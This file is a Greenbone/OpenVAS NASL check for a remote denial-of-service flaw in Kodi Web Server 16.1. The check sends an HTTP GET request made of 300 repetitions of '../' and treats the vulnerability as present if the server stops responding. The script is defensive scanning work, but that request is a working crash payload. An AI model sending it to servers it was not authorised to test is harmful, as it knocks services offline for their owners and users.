CPE = "cpe:/a:kodi:kodi";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.808283" );
	script_version( "2021-09-07T06:04:54+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_tag( name: "last_modification", value: "2021-09-07 06:04:54 +0000 (Tue, 07 Sep 2021)" );
	script_tag( name: "creation_date", value: "2016-08-08 18:13:32 +0530 (Mon, 08 Aug 2016)" );
	script_name( "Kodi Web Server Remote Denial Of Service Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Denial of Service" );
	script_dependencies( "gb_kodi_web_server_detect.sc" );
	script_require_ports( "Services/www", 8080 );
	script_mandatory_keys( "Kodi/WebServer/installed" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/40208" );
	script_tag( name: "summary", value: "The host is running Kodi Web Server
  and is prone to remote denial of service vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET
  and check whether it is able to crash or not." );
	script_tag( name: "insight", value: "The flaw is due to an error when processing
  web requests and can be exploited to cause a buffer overflow via an overly long
  string passed to GET request." );
	script_tag( name: "impact", value: "Successful exploitation may allow remote
  attackers to cause the application to crash, creating a denial-of-service
  condition." );
	script_tag( name: "affected", value: "Kodi Web Server version 16.1, other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(http_is_dead( port: port )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
craftData = crap( length: 300, data: "../" );
req = "GET " + craftData + " HTTP/1.1\r\n\r\n";
http_send_recv( port: port, data: req );
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

